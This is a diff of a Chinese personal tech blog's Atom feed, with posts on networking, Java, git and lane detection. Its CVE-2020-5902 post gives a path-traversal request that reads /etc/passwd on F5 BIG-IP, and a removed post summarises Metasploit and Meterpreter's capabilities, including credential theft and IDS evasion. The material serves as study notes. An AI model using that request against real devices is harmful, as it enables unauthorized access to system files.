@@ -1,11 +1,19 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-06T15:11:32+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-08T09:11:17-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
 &lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
   &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
 &lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
   &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
-</subtitle><entry><title type="html">cve-2020-5902</title><link href="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/" rel="alternate" type="text/html" title="cve-2020-5902" /><published>2020-07-06T00:00:00+08:00</published><updated>2020-07-06T00:00:00+08:00</updated><id>http://localhost:4000/_posts/cve-2020-5902</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/">&lt;p&gt;[toc]&lt;/p&gt;
+</subtitle><entry><title type="html">ubuntu安装问题及后续配置</title><link href="http://localhost:4000/_posts/2020-07-08-ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE/" rel="alternate" type="text/html" title="ubuntu安装问题及后续配置" /><published>2020-07-08T00:00:00-04:00</published><updated>2020-07-08T00:00:00-04:00</updated><id>http://localhost:4000/_posts/ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-08-ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE/">&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;
+
+&lt;h1 id=&quot;安装中出现的问题总结&quot;&gt;安装中出现的问题总结&lt;/h1&gt;
+
+&lt;h1 id=&quot;后续配置&quot;&gt;后续配置&lt;/h1&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry><entry><title type="html">cve-2020-5902</title><link href="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/" rel="alternate" type="text/html" title="cve-2020-5902" /><published>2020-07-06T00:00:00-04:00</published><updated>2020-07-06T00:00:00-04:00</updated><id>http://localhost:4000/_posts/cve-2020-5902</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;&lt;code&gt;警告,用于学习,切勿做破坏,造成的后果本人概不负责&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
 
@@ -76,7 +84,7 @@
 &lt;h1 id=&quot;利用&quot;&gt;利用&lt;/h1&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00+08:00</published><updated>2020-07-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00-04:00</published><updated>2020-07-05T00:00:00-04:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。&lt;/p&gt;
@@ -166,7 +174,7 @@ POST的安全性要比GET的安全性高。注意：这里所说的安全性和�
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为&quot;GET&quot;，实质上，GET和POST只是发送机制不同，并不是一个取一个发
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">ICMP协议和ping命令</title><link href="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/" rel="alternate" type="text/html" title="ICMP协议和ping命令" /><published>2020-07-05T00:00:00+08:00</published><updated>2020-07-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">ICMP协议和ping命令</title><link href="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/" rel="alternate" type="text/html" title="ICMP协议和ping命令" /><published>2020-07-05T00:00:00-04:00</published><updated>2020-07-05T00:00:00-04:00</updated><id>http://localhost:4000/_posts/ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;p&gt;ICMP全称Internet Control Message Protocol，就是&lt;strong&gt;互联网控制报文协议&lt;/strong&gt;。
  ICMP 报文是封装在 IP 包里面的。因为传输指令的时候，肯定需要&lt;strong&gt;源地址&lt;/strong&gt;和&lt;strong&gt;目标地址&lt;/strong&gt;。它本身非常简单。因为作为侦查兵，要轻装上阵，不能携带大量的包袱&lt;/p&gt;
@@ -175,7 +183,7 @@ POST的安全性要比GET的安全性高。注意：这里所说的安全性和�
 
 &lt;blockquote&gt;
   &lt;p&gt;ICMP 报文有很多的类型，不同的类型有不同的代码。最常用的类型是主动请求为 8，主动请求的应答为0&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP和HTTPS</title><link href="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/" rel="alternate" type="text/html" title="HTTP和HTTPS" /><published>2020-07-04T00:00:00+08:00</published><updated>2020-07-04T00:00:00+08:00</updated><id>http://localhost:4000/_posts/HTTP%E5%92%8CHTTPS</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP和HTTPS</title><link href="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/" rel="alternate" type="text/html" title="HTTP和HTTPS" /><published>2020-07-04T00:00:00-04:00</published><updated>2020-07-04T00:00:00-04:00</updated><id>http://localhost:4000/_posts/HTTP%E5%92%8CHTTPS</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;h1 id=&quot;http和https的基本概念&quot;&gt;&lt;strong&gt;Http和Https的基本概念&lt;/strong&gt;&lt;/h1&gt;
 
@@ -333,7 +341,7 @@ POST的安全性要比GET的安全性高。注意：这里所说的安全性和�
 
 &lt;blockquote&gt;
   &lt;p&gt;服务器证书(server certificates)是SSL数字证书的一种形式，意指通过提交数字证书来证明您的身份或表明您有权访问在线服务。再者简单来说，通过使用服务器证书可为不同站点提供身份鉴定并保证该站点拥有高强度加密安全。是组成Web服务器的SSL安全功能的唯一的数字标识。通过相互信任的第三方组织获得，并为用户 提供验证您Web站点身份的手段。服务器证书包含详细的身份验证信息，如服务器内容附属的组织、颁发证书的组织以及称为公开密钥的唯一的身份验证文件&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">JAVA线程池</title><link href="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="alternate" type="text/html" title="JAVA线程池" /><published>2020-07-02T00:00:00+08:00</published><updated>2020-07-02T00:00:00+08:00</updated><id>http://localhost:4000/_posts/JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">JAVA线程池</title><link href="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="alternate" type="text/html" title="JAVA线程池" /><published>2020-07-02T00:00:00-04:00</published><updated>2020-07-02T00:00:00-04:00</updated><id>http://localhost:4000/_posts/JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;如果并发的线程数量很多，并且每个线程都是执行一个时间很短的任务就结束了，这样频繁创建线程就会大大降低系统的效率，因为频繁创建线程和销毁线程需要时间。那么有没有一种办法使得线程可以复用，就是执行完一个任务，并不被销毁，而是可以继续执行其他的任务？在Java中可以通过线程池来达到这样的效果&lt;/p&gt;
@@ -1105,7 +1113,7 @@ public static ExecutorService newCachedThreadPool() {
 
 &lt;p&gt;　　如果是IO密集型任务，参考值可以设置为2&lt;em&gt;*N&lt;/em&gt;CPU&lt;/p&gt;
 
-&lt;p&gt;　　当然，这只是一个参考值，具体的设置还需要根据实际情况进行调整，比如可以先将线程池大小设置为参考值，再观察任务运行情况和系统负载、资源利用率来进行适当调整。&lt;/p&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">设计模式</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" rel="alternate" type="text/html" title="设计模式" /><published>2020-07-01T00:00:00+08:00</published><updated>2020-07-01T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;p&gt;　　当然，这只是一个参考值，具体的设置还需要根据实际情况进行调整，比如可以先将线程池大小设置为参考值，再观察任务运行情况和系统负载、资源利用率来进行适当调整。&lt;/p&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">设计模式</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" rel="alternate" type="text/html" title="设计模式" /><published>2020-07-01T00:00:00-04:00</published><updated>2020-07-01T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;h1 id=&quot;创建型模式&quot;&gt;&lt;strong&gt;创建型模式&lt;/strong&gt;&lt;/h1&gt;
 
@@ -1365,7 +1373,7 @@ public class Singleton3 {
 
 &lt;h3 id=&quot;并发型模式&quot;&gt;并发型模式&lt;/h3&gt;
 
-&lt;h2 id=&quot;线程池模式&quot;&gt;线程池模式&lt;/h2&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">车道保持&amp;amp;疲劳驾驶检测</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/" rel="alternate" type="text/html" title="车道保持&amp;疲劳驾驶检测" /><published>2020-07-01T00:00:00+08:00</published><updated>2020-07-01T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;h2 id=&quot;线程池模式&quot;&gt;线程池模式&lt;/h2&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">车道保持&amp;amp;疲劳驾驶检测</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/" rel="alternate" type="text/html" title="车道保持&amp;疲劳驾驶检测" /><published>2020-07-01T00:00:00-04:00</published><updated>2020-07-01T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/verylazycat/DriverAssistanceSystem&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
 
@@ -2651,7 +2659,7 @@ cmake ..
 make
 chmod +x lane_car_detect
 ./lane_car_detect
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="机器学习" /><summary type="html">[toc]</summary></entry><entry><title type="html">Git实现原理</title><link href="http://localhost:4000/_posts/2020-06-30-git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/" rel="alternate" type="text/html" title="Git实现原理" /><published>2020-06-30T00:00:00+08:00</published><updated>2020-06-30T00:00:00+08:00</updated><id>http://localhost:4000/_posts/git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-30-git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">&lt;p&gt;title:git实现原理
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="机器学习" /><summary type="html">[toc]</summary></entry><entry><title type="html">Git实现原理</title><link href="http://localhost:4000/_posts/2020-06-30-git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/" rel="alternate" type="text/html" title="Git实现原理" /><published>2020-06-30T00:00:00-04:00</published><updated>2020-06-30T00:00:00-04:00</updated><id>http://localhost:4000/_posts/git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-30-git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">&lt;p&gt;title:git实现原理
 tags: git&lt;/p&gt;
 
 &lt;p&gt;[toc]&lt;/p&gt;
@@ -2968,7 +2976,7 @@ Date: Fri May 5 19:00:48 2017 +0800
 
 &lt;p&gt;Tag对象就是里程碑的作用，一般在我们正式发布代码是需要建立一个里程碑。&lt;/p&gt;
 
-&lt;h1 id=&quot;工作区暂存区版本库&quot;&gt;工作区、暂存区、版本库&lt;/h1&gt;</content><author><name></name></author><summary type="html">title:git实现原理 tags: git</summary></entry><entry><title type="html">西华大学抢课脚本</title><link href="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/" rel="alternate" type="text/html" title="西华大学抢课脚本" /><published>2020-06-29T00:00:00+08:00</published><updated>2020-06-29T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;h1 id=&quot;工作区暂存区版本库&quot;&gt;工作区、暂存区、版本库&lt;/h1&gt;</content><author><name></name></author><summary type="html">title:git实现原理 tags: git</summary></entry><entry><title type="html">西华大学抢课脚本</title><link href="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/" rel="alternate" type="text/html" title="西华大学抢课脚本" /><published>2020-06-29T00:00:00-04:00</published><updated>2020-06-29T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;h1 id=&quot;环境配置&quot;&gt;环境配置&lt;/h1&gt;
 
@@ -3088,421 +3096,4 @@ Date: Fri May 5 19:00:48 2017 +0800
 })();
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;感谢吴同学分享的脚本,[github](https://github.com/Sherlockouo/script/tree/master/study&lt;/p&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">metasploit使用总结</title><link href="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="metasploit使用总结" /><published>2020-06-27T00:00:00+08:00</published><updated>2020-06-27T00:00:00+08:00</updated><id>http://localhost:4000/_posts/metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;
-
-&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;
-
-&lt;h2 id=&quot;官网地址&quot;&gt;&lt;a href=&quot;https://www.metasploit.com/&quot;&gt;官网地址&lt;/a&gt;&lt;/h2&gt;
-
-&lt;h2 id=&quot;版本&quot;&gt;版本&lt;/h2&gt;
-
-&lt;p&gt;Metasploit的四个版本：&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Pro&lt;/strong&gt;：适用于渗透测试人员和IT安全团队&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Express&lt;/strong&gt;：适用于一般IT人员&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Community&lt;/strong&gt;：适用于小公司和学生&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Framework&lt;/strong&gt;：适用于开发人员和安全研究人员&lt;/p&gt;
-
-&lt;h2 id=&quot;linux平台上安装&quot;&gt;Linux平台上安装&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \
-chmod 755 msfinstall &amp;amp;&amp;amp; \
-./msfinstall
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;详细过程参考官网&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;初始化&quot;&gt;初始化&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;service postgresql start &amp;amp;&amp;amp; msfdb init &amp;amp;&amp;amp; msfconsole
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;主要是数据库初始化&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;metasploit结构&quot;&gt;Metasploit结构&lt;/h1&gt;
-
-&lt;h1&gt;&lt;img src=&quot;/home/admin233/博客/verylazycat.github.io/img/meta.png&quot; alt=&quot;meta&quot; /&gt;&lt;/h1&gt;
-
-&lt;h2 id=&quot;目录结构&quot;&gt;目录结构&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;data目录：里面存放一些可编辑的文件，主要是给Metasploit使用
-documentation目录：提供一些MSF的介绍文档等
-external目录：源文件和第三方的库
-lib目录：MSF框架的主要组成部分
-modules目录：MSF的模块存放位置
-plugins目录：存放Metasploit的插件
-scripts目录：存放Meterpreter代码（shell code）或者是其他的脚本文件
-tools目录：各种各样实用的命令行工具
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;help&quot;&gt;HELP&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Core Commands
-=============
-
-    Command       Description
-    -------       -----------
-    ?             Help menu
-    banner        Display an awesome metasploit banner
-    cd            Change the current working directory
-    color         Toggle color
-    connect       Communicate with a host
-    exit          Exit the console
-    get           Gets the value of a context-specific variable
-    getg          Gets the value of a global variable
-    grep          Grep the output of another command
-    help          Help menu
-    history       Show command history
-    load          Load a framework plugin
-    quit          Exit the console
-    repeat        Repeat a list of commands
-    route         Route traffic through a session
-    save          Saves the active datastores
-    sessions      Dump session listings and display information about sessions
-    set           Sets a context-specific variable to a value
-    setg          Sets a global variable to a value
-    sleep         Do nothing for the specified number of seconds
-    spool         Write console output into a file as well the screen
-    threads       View and manipulate background threads
-    tips          Show a list of useful productivity tips
-    unload        Unload a framework plugin
-    unset         Unsets one or more context-specific variables
-    unsetg        Unsets one or more global variables
-    version       Show the framework and console library version numbers
-
-
-Module Commands
-===============
-
-    Command       Description
-    -------       -----------
-    advanced      Displays advanced options for one or more modules
-    back          Move back from the current context
-    clearm        Clear the module stack
-    info          Displays information about one or more modules
-    listm         List the module stack
-    loadpath      Searches for and loads modules from a path
-    options       Displays global options or for one or more modules
-    popm          Pops the latest module off the stack and makes it active
-    previous      Sets the previously loaded module as the current module
-    pushm         Pushes the active or list of modules onto the module stack
-    reload_all    Reloads all modules from all defined module paths
-    search        Searches module names and descriptions
-    show          Displays modules of a given type, or all modules
-    use           Interact with a module by name or search term/index
-
-
-Job Commands
-============
-
-    Command       Description
-    -------       -----------
-    handler       Start a payload handler as job
-    jobs          Displays and manages jobs
-    kill          Kill a job
-    rename_job    Rename a job
-
-
-Resource Script Commands
-========================
-
-    Command       Description
-    -------       -----------
-    makerc        Save commands entered since start to a file
-    resource      Run the commands stored in a file
-
-
-Database Backend Commands
-=========================
-
-    Command           Description
-    -------           -----------
-    analyze           Analyze database information about a specific address or address range
-    db_connect        Connect to an existing data service
-    db_disconnect     Disconnect from the current data service
-    db_export         Export a file containing the contents of the database
-    db_import         Import a scan result file (filetype will be auto-detected)
-    db_nmap           Executes nmap and records the output automatically
-    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
-    db_remove         Remove the saved data service entry
-    db_save           Save the current data service connection as the default to reconnect on startup
-    db_status         Show the current data service status
-    hosts             List all hosts in the database
-    loot              List all loot in the database
-    notes             List all notes in the database
-    services          List all services in the database
-    vulns             List all vulnerabilities in the database
-    workspace         Switch between database workspaces
-
-
-Credentials Backend Commands
-============================
-
-    Command       Description
-    -------       -----------
-    creds         List all credentials in the database
-
-
-Developer Commands
-==================
-
-    Command       Description
-    -------       -----------
-    edit          Edit the current module or a file with the preferred editor
-    irb           Open an interactive Ruby shell in the current context
-    log           Display framework.log paged to the end if possible
-    pry           Open the Pry debugger on the current module or Framework
-    reload_lib    Reload Ruby library files from specified paths
-
-
-msfconsole
-==========
-
-`msfconsole` is the primary interface to Metasploit Framework. There is quite a
-lot that needs go here, please be patient and keep an eye on this space!
-
-Building ranges and lists
--------------------------
-
-Many commands and options that take a list of things can use ranges to avoid
-having to manually list each desired thing. All ranges are inclusive.
-
-### Ranges of IDs
-
-Commands that take a list of IDs can use ranges to help. Individual IDs must be
-separated by a `,` (no space allowed) and ranges can be expressed with either
-`-` or `..`.
-
-### Ranges of IPs
-
-There are several ways to specify ranges of IP addresses that can be mixed
-together. The first way is a list of IPs separated by just a ` ` (ASCII space),
-with an optional `,`. The next way is two complete IP addresses in the form of
-`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
-specifications may also be used, however the whole address must be given to
-Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
-Additionally, a netmask can be used in conjunction with a domain name to
-dynamically resolve which block to target. All these methods work for both IPv4
-and IPv6 addresses. IPv4 addresses can also be specified with special octet
-ranges from the [NMAP target
-specification](https://nmap.org/book/man-target-specification.html)
-### Examples
-Terminate the first sessions:
-    sessions -k 1
-Stop some extra running jobs:
-    jobs -k 2-6,7,8,11..15
-Check a set of IP addresses:
-    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
-Target a set of IPv6 hosts:
-    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
-Target a block from a resolved domain name:
-    set RHOSTS www.example.test/24
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;meterpreter&quot;&gt;Meterpreter&lt;/h1&gt;
-
-&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
-
-&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。&lt;/p&gt;
-
